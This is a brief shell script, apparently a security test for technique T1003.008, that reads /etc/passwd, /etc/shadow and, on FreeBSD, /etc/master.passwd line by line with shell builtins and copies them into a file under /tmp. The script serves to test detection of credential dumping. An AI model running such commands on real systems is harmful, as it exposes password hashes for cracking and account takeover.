#!/bin/sh
# T1003.008 test 5: Access /etc/{shadow,passwd,master.passwd} with shell builtins
# elevation_required: True
testcat(){ (while read line; do echo $line >> /tmp/T1003.008.txt; done < $1) }
[ "$(uname)" = 'FreeBSD' ] && testcat /etc/master.passwd
testcat /etc/passwd
testcat /etc/shadow
